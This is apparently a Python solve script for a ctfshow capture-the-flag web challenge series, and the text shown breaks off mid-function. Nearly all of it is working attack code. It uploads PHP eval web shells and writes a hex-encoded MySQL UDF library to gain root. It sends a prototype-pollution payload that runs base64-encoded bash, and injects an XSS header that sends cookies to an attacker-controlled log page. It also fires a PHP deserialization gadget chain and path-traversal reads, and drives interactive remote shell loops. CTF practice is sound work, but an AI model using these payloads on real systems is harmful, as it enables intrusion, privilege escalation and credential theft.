import re
import subprocess
import base64
import time
from time import sleep

import requests
from urllib.parse import unquote,quote



def pattern_get_flag(response,pattern=r"flag_\d+=ctfshow\{[0-9a-f]+\}"):

    if response.status_code == 200:
        content = unquote(response.text)
        if "flag_660" in content:
            pattern=r"flag_660_ctfshow\{[0-9a-f]+\}"
            match = re.search(pattern, content)
            if match:
                return match.group()
        match = re.search(pattern, content)
        if match:
            # 打印匹配的字符串
            if "flag_640" in match.group():
                flag=[]
                flag.append(match.group())
                for header, value in response.headers.items():
                    match = re.search(pattern, header) or re.search(pattern, value)
                    if match:
                        # 打印匹配的字符串
                        flag.append(match.group())
                        return flag
                print("暂未匹配成功，请稍等~~~~")
            return match.group()
    else:
        print(f"请求失败，状态码: {response.status_code}")


def  backup_name():
    global backup
    response = sess.get(url+path_backup)
    # 检查响应状态码
    if response.status_code == 200:
        # 获取响应内容
        content = unquote(response.text)
        if "flag_645" in content:
            backup = content
    else:
        print(f"请求失败，状态码: {response.status_code}")


def read_page(url1):
    response = sess.get(url1)
    flag = pattern_get_flag(response)
    return flag


def read_file(url1):
    global flag645
    pattern = r"flag646=ctfshow\{[0-9a-f]+\}"
    path = f"/system36d/users.php?action=remoteUpdate&auth={flag645[9:]}&update_address=/var/www/html/system36d/init.php"
    response = sess.get(url1+path)
    return pattern_get_flag(response,pattern)


def unserialize():
    # 定义内联 PHP 代码
    php_code = """
    class a {
        public $username = '123';
        public $y0ng = "ctfshow";
    }
    
    $a = new a();
    echo serialize($a);
    """
    # 使用 subprocess 执行内联 PHP 代码
    try:
        # 注意：将 php_code 转换为单行字符串，并使用 repr() 来处理引号
        result = subprocess.run(['php', '-r', php_code], capture_output=True, text=True, check=True)
        output = result.stdout.strip()
        return output
    except subprocess.CalledProcessError as e:
        print(f"PHP 代码执行出错: {e.stderr}")


def users(path):
    global flag_user
    flag_user.append(read_page(url + path))
    path_648 = f"/system36d/users.php?action=evilClass&m=1&key={flag_user[0]}"
    flag_user.append(read_page(url + path_648))
    path_649 = f"/system36d/users.php?action=evilNumber&m=&key={flag_user[1]}"
    flag_user.append(read_page(url + path_649))
    path_650 = f"/system36d/users.php?action=evilFunction&m=getenv&key={flag_user[2]}"
    flag_user.append(read_page(url + path_650))
    path_651 = f"/system36d/users.php?action=evilArray&m={unserialize()}&key={flag_user[3]}"
    flag_user.append(read_page(url + path_651))


def get_key(url1,path,payload):
    pattern=r"欢迎[a-z_]+,"
    response = sess.get(url1 + path+ payload)
    return  pattern_get_flag(response,pattern)[2:22]


def getshell(flag,path,key):
    #模拟数据备份
    files={'file':('1.dat',"<?php eval($_POST[1]);?>","application/ms-tnef")}
    #生成木马
    sess.post(url+path,files=files)
    udf="file_put_contents('udf.so',hex2bin('7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e8162000'));"
    data1={"key":key,"file":"../db/data_you_never_know.db","1":"file_put_contents('shell.php','<?php eval($_POST[\"freedom\"]);?>');"}
    data2={"key":key,"file":"../db/data_you_never_know.db","1":udf}
    # print(data2)
    sess.post(url+f'/system36d/util/common.php?k={flag}',data=data1)
    # print(a.text)
    sess.post(url+f'/system36d/util/common.php?k={flag}',data=data2)
    # print(b.text)
    reback(url,path_upload,backup)
    path_shell="/system36d/util/shell.php"
    payload1 = 'cp shell.php /var/www/html/shell.php'
    payload2 = "cat /s*"

    # payload = input("$ :")
    sess.post(url+path_shell,data={'freedom':f'echo `{payload1}`;'})
    getpc2ip()

    return sess.post(url+"shell.php",data={'freedom':f'echo `{payload2}`;'}).text


def getpc2ip():
    global ip,payload_phpinfo,payload_flag659,payload_flag660,payload_flag661,payload_flag663,payload_flag665
    hosts=sess.post(url+"/shell.php",data={'freedom':'echo `cat /etc/hosts`;'})
    ip1=re.search('(172.*?)web',hosts.text)[0].strip()
    p1="172.\d{1,3}.\d{1,3}.\d{1,3}"
    match = re.search(p1, ip1)
    ip2=re.sub("\.4",'.5',match.group())  #另外一台服务器地址
    ip.append(match.group())
    ip.append(ip2)
    payload_phpinfo = f"curl http://{ip[1]}/phpinfo.php"
    payload_flag659 = f"curl http://{ip[1]}/public../FLAG/flag659.txt"
    payload_flag660 = f"curl http://{ip[1]}/public../var/log/nginx/ctfshow_web_access_log_file_you_never_know.log"
    payload_flag661 = f"curl http://{ip[1]}/public../home/flag/secret.txt"
    payload_flag663 = f"curl http://{ip[1]}/public../usr/local/lib/php/extensions/no-debug-non-zts-20180731/ctfshow.so"
    payload_flag665 = f"curl http://{ip[1]}/public../FLAG665"

    return ip


def shellinpc1(payload):
    response = sess.post(url+'shell.php',data={'freedom':f"echo `{payload}`;"})
    return pattern_get_flag(response)


def xss2login():
    global cookie
    a=''
    file  = '<?php highlight_file(__FILE__);$parameter = $_SERVER[\"QUERY_STRING\"].$_SERVER[\"HTTP_COOKIE\"];file_put_contents(\"log.txt\",$parameter);'
    payload1 = f"file_put_contents('log.php','{file}');?>"
    sess.post(url+'shell.php',data={'freedom':payload1})
    u=f"http://{ip[0]}/log.php?s=" #当然每个人的内网地址可能不一样
    sess.post(url+'shell.php',data={'freedom':a})
    for i in u:
        a=a+str(ord(i))+','
    a=re.sub(",$",'',a)
    u2 = f"http://{ip[1]}/index.php?action=login\&u=0002\&p=345"
    header = f"X-Forwarded-For:<script>window.location.href=String.fromCharCode({a})+document.cookie;</script>"
    payload2 = f'`curl -H "{header}" {u2}`;'
    sess.post(url+"shell.php",data={'freedom':payload2})
    ## 隔上一两分钟访问log.txt就能拿到cookie和auth
    while True:
        try:
            log=sess.get(url+'log.txt').text
            phpsessid=re.findall("(PHPSESSID=.*?);%20",log)[0]
            auth=re.findall("(auth=.*)",log)[0]
            flag656=str(base64.b64decode(auth))
            #web656
            pattern = r"flag_656=ctfshow{.*?}"
            match = re.search(pattern, flag656)
            if match:
                cookie["cookie"]=phpsessid
                cookie["auth"] = auth
                cookie["flag"] = match.group()
                # 打印匹配的字符串
                return cookie
            else:
                print("请稍等~~~~")
        except:
            print('请稍等~~~~')
            time.sleep(60)# 应该是一分钟一次


def web668():
    global flag_666,flag_668,flag_669
    re.findall('flag_.*?=ctfshow{.*?}',sess.post(url+'shell.php',data={'freedom':"echo file_get_contents('http://{0}:3000');".format(ip[1])}).text)
    a='''echo `curl -i -X POST -H 'Content-type':'application/json' -d "{\\"__proto__\\":{\\"__proto__\\": {\\"type\\":\\"Block\\",\\"nodes\\":\\"\\",\\"compileDebug\\":1,\\"self\\":1,\\"line\\":\\"global.process.mainModule.require('child_process').exec('echo YmFzaCAtYyAiZWNobyBkbUZ5SUdoMGRIQWdQU0J5WlhGMWFYSmxLQ2RvZEhSd0p5azdDblpoY2lCeGRXVnllWE4wY21sdVp5QTlJSEpsY1hWcGNtVW9KM0YxWlhKNWMzUnlhVzVuSnlrN0NncDJZWElnY0c5emRFaFVUVXdnUFNBbk1USXpKenNLSUFwb2RIUndMbU55WldGMFpWTmxjblpsY2lobWRXNWpkR2x2YmlBb2NtVnhMQ0J5WlhNcElIc0tJQ0IyWVhJZ1ltOWtlU0E5SUNJaU93b2dJSEpsY1M1dmJpZ25aR0YwWVNjc0lHWjFibU4wYVc5dUlDaGphSFZ1YXlrZ2V3b2dJQ0FnWW05a2VTQXJQU0JqYUhWdWF6c0tJQ0I5S1RzS0lDQnlaWEV1YjI0b0oyVnVaQ2NzSUdaMWJtTjBhVzl1SUNncElIc0tJQ0FnSUdKdlpIa2dQU0J4ZFdWeWVYTjBjbWx1Wnk1d1lYSnpaU2hpYjJSNUtUc0tJQ0FnSUhKbGN5NTNjbWwwWlVobFlXUW9NakF3TENCN0owTnZiblJsYm5RdFZIbHdaU2M2SUNkMFpYaDBMMmgwYld3N0lHTm9ZWEp6WlhROWRYUm1PQ2Q5S1RzS0lIUnllWHNLSUNBZ0lHbG1LR0p2WkhrdVkyMWtLU0I3Q2lBZ0lDQWdJQ0FnY21WekxuZHlhWFJsS0NKMWMyVnlibUZ0WmUrOG1pSWdLeUJpYjJSNUxtTnRaQ2s3Q2lBZ0lDQWdJQ0FnZG1GeUlISmxjM1ZzZEQwZ1oyeHZZbUZzTG5CeWIyTmxjM011YldGcGJrMXZaSFZzWlM1amIyNXpkSEoxWTNSdmNpNWZiRzloWkNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTlRlVzVqS0NkaVlYTm9JQzFqSUNJbksySnZaSGt1WTIxa0t5Y2lKeWt1ZEc5VGRISnBibWNvS1RzS0lDQWdJQ0FnSUNCeVpYTXVkM0pwZEdVb2NtVnpkV3gwS1RzS0lDQWdJSDBnWld4elpTQjdDaUFnSUNBZ0lDQWdjbVZ6TG5keWFYUmxLSEJ2YzNSSVZFMU1LVHNLSUNBZ0lIMTlDaUFnSUNCallYUmphSHNLSUNBZ0lDQWdJSEpsY3k1M2NtbDBaU2h3YjNOMFNGUk5UQ2s3SUFvZ0lDQWdmUW9nSUNBZ2NtVnpMbVZ1WkNncE93b2dJSDBwT3dwOUtTNXNhWE4wWlc0b09EQXpNeWs3Q2c9PXxiYXNlNjQgLWQgPiAvaG9tZS9ub2RlL2FhLmpzO25vZGUgL2hvbWUvbm9kZS9hYS5qcyI=|base64 -d|bash')\\"}}}" http://'''+ip[1]+''':3000/login`;'''
    sess.post(url+"shell.php",data={'freedom':a})
    sess.post(url+"shell.php",data={'freedom':'echo `curl -X POST -d "1=123" http://{0}:3000`;'.format(ip[1])})
    while True:
        try:
            payload1 = f"echo `curl -X POST -d \"cmd=mysql -uroot -proot -e 'use ctfshow;select * from ctfshow_secret'\" http://{ip[1]}:8033`;"
            response = sess.post(url+'shell.php',data={'freedom':payload1})
            flag_666 = pattern_get_flag(response)

            #web668
            flag_668 =(re.findall('flag_.*?=ctfshow{.*?}',sess.post(url+'shell.php',data={'freedom':"echo `curl -X POST -d \"cmd=tac secret.txt\" http://{0}:8033`;".format(ip[1])}).text)[0])
            sess.post(url+'shell.php',data={'freedom':"echo `curl -X POST -d \"cmd=rm -rf  nodestartup.sh;echo 'cat /root/* > /home/node/a.txt ' > nodestartup.sh\" http://{0}:8033`;".format(ip[1])})
            #web669
            while True:
                response=sess.post(url+'shell.php',data={'freedom':"echo `curl -X POST -d \"cmd=cat a.txt\" http://{0}:8033`;".format(ip[1])})
                flag_669 = pattern_get_flag(response)
                break
            break
        except :
            pass


def cookie2get():
    global cookie
    payload = f'echo ` curl -H "Cookie:{cookie["cookie"]};{cookie["auth"]}" -i http://{ip[1]}/index.php?action=main\\&m=getFlag`;'
    r2=sess.post(url+"shell.php",data={'freedom':payload})
    return pattern_get_flag(r2)


def shell():
    while True:
        hostname = sess.post(url+"/shell.php",data={'freedom':f'echo `hostname`;'}).text
        user = sess.post(url+"/shell.php",data={'freedom':f'echo `whoami`;'}).text
        pwd=sess.post(url+"/shell.php",data={'freedom':f'echo `pwd`;'}).text
        hostname = hostname.replace('\n', '').strip()
        user = user.replace('\n', '').strip()
        pwd =pwd.replace('\n', '').strip()
        payload = input(f"({user}@{hostname})-[{pwd}]\n"
                        f"$  :")
        print(sess.post(url+"/shell.php",data={'freedom':f'echo `{payload}`;'}).text)
        if payload == "exit":
            break

def shell2():
    while True:
        hostname = sess.post(url+"/shell.php",data={'freedom':f"echo `curl -X POST -d \"cmd=hostname\" http://{format(ip[1])}:8033`;"}).text[17:]
        user = sess.post(url+"/shell.php",data={'freedom':f"echo `curl -X POST -d \"cmd=user\" http://{format(ip[1])}:8033`;"}).text[13:]
        pwd=sess.post(url+"/shell.php",data={'freedom':f"echo `curl -X POST -d \"cmd=pwd\" http://{format(ip[1])}:8033`;"}).text[12:]
        hostname = hostname.replace('\n', '').strip()
        user = user.replace('\n', '').strip()
        pwd =pwd.replace('\n', '').strip()
        payload = input(f"({user}@{hostname})-[{pwd}]\n"
                    f"$  :")
        length=len(payload)
        print(sess.post(url+'shell.php',data={'freedom':f"echo `curl -X POST -d \"cmd={payload}\" http://{format(ip[1])}:8033`;"}).text[9+length:])
        if payload == "exit":
            break

def udfgetroot():
    #udf提权
    payload = 'cp /var/www/html/system36d/util/udf.so /usr/lib/mariadb/plugin/udf.so'
    sess.post(url+"/shell.php",data={'freedom':f'echo `{payload}`;'})
    sess.post(url+"shell.php",data={'freedom':'`mysql -uroot -proot -e "create function sys_eval returns string soname \'udf.so\'"`;'})
    cmd='''mysql -uroot -proot -e "select sys_eval('sudo cat /root/you_win')"'''
    cmd=base64.b64encode(cmd.encode()).decode()
    datax={'freedom':'echo `echo {0}|base64 -d|sh`;'.format(cmd)}
    response = sess.post(url+"shell.php",data=datax)
    return pattern_get_flag(response)


def web658():
    global ip
    ser="O%3A32%3A%22Codeception%5CExtension%5CRunProcess%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00output%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bs%3A5%3A%22jiang%22%3B%7Ds%3A43%3A%22%00Codeception%5CExtension%5CRunProcess%00processes%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3BO%3A28%3A%22GuzzleHttp%5CPsr7%5CAppendStream%22%3A2%3A%7Bs%3A37%3A%22%00GuzzleHttp%5CPsr7%5CAppendStream%00streams%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A29%3A%22GuzzleHttp%5CPsr7%5CCachingStream%22%3A2%3A%7Bs%3A43%3A%22%00GuzzleHttp%5CPsr7%5CCachingStream%00remoteStream%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bb%3A0%3B%7Ds%3A6%3A%22stream%22%3BO%3A26%3A%22GuzzleHttp%5CPsr7%5CPumpStream%22%3A3%3A%7Bs%3A34%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00source%22%3BC%3A32%3A%22Opis%5CClosure%5CSerializableClosure%22%3A231%3A%7Ba%3A5%3A%7Bs%3A3%3A%22use%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22function%22%3Bs%3A76%3A%22function%28%29%7B%5Cphpinfo%28%29%3B%5Chighlight_file%28%27%2Fvar%2Fwww%2Fhtml%2Fflag.php%27%29%3B%5Cphpinfo%28%29%3B%7D%22%3Bs%3A5%3A%22scope%22%3Bs%3A26%3A%22GuzzleHttp%5CPsr7%5CPumpStream%22%3Bs%3A4%3A%22this%22%3BN%3Bs%3A4%3A%22self%22%3Bs%3A32%3A%22000000004e63ed86000000002cc68e15%22%3B%7D%7Ds%3A32%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00size%22%3Bi%3A-10%3Bs%3A34%3A%22%00GuzzleHttp%5CPsr7%5CPumpStream%00buffer%22%3BO%3A22%3A%22Faker%5CDefaultGenerator%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00default%22%3Bs%3A1%3A%22j%22%3B%7D%7D%7D%7Ds%3A38%3A%22%00GuzzleHttp%5CPsr7%5CAppendStream%00seekable%22%3Bb%3A1%3B%7D%7D%7D%7D"
    data={'freedom':f'echo ` curl  -H "Content-Type: application/x-www-form-urlencoded"   -X POST  -d "UnserializeForm[ctfshowUnserializeData]={ser}" http://{ip[1]}:8888?r=site/unserialize\\&key=flag_663%3Dctfshow%7Bfa5cc1fb0bfc986d1ef150269c0de197%7D`;'}
    response = sess.post(url+"shell.php",data=data)
    # 使用正则表达式搜索匹配的字符串
    p1 = r'flag_658=(.*?)ctfshow\{[0-9a-f]+\}'
    return pattern_get_flag(response,p1)


def reback(url1,path,back):
    #恢复数据备份
    files={'file':('1.dat',f"{back}","application/ms-tnef")}
    #生成木马
    sess.post(url1+path,files=files)


def web662():
    # i=2238
    for i in range(0,4096):
        name=format(hex(i).replace('0x','').zfill(3))
        response=sess.post(url+'shell.php',data={'freedom':f'echo file_get_contents("http://{ip[1]}/{name}.html");'})
        content = unquote(response.text)
        p = r'flag_662=(.*?)ctfshow\{[0-9a-f]+\}'
        match = re.search(p, content)
        if match:
            # print (i)
            # 打印匹配的字符串
            return match.group()
    else:
        print("请稍等~~~~")


def web667():
    response = sess.post(url+'shell.php',data={'freedom':f"echo `curl http://{format(ip[1])}:3000`;"})
    return pattern_get_flag(response)


def web664():
    #web664
    global flag_663
